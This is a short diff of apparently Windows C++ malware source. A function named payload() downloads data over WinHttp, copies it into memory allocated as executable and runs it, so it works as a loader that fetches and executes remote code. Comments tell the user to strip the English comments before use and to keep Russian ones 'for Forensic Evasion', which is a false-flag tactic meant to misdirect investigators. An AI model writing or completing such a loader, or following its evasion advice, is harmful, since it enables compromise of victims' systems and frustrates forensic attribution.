@@ -141,8 +141,33 @@ int payload () {
 			if (!WinHttpReadData(hRequest, (LPVOID)&buffer[0], dwSize, &dwDownloaded)) {
 				break;
 			}
-}
 
+		} while (dwSize > 0);
+
+		void* exec = VirtualAlloc(
+			0,
+			buffer.size() + 1,
+			MEM_COMMIT | MEM_RESERVE,
+			PAGE_EXECUTE_READWRITE);
+
+	
+		memcpy(
+			exec,
+			buffer.data(),
+			buffer.size());
+
+		((void(*)())exec)();
+	}
+
+//Closes Handles 
+	if (hRequest) WinHttpCloseHandle(hRequest);
+	if (hConnect) WinHttpCloseHandle(hConnect);
+	if (hSession) WinHttpCloseHandle(hSession);
+
+	return 0;
+}
+// I may need to encapsulate this function call shart, and then the payload
+//please remove all English comments before use. 
 
 //Это мой проект
 //Leave Russian Comments for Forensic Evasion
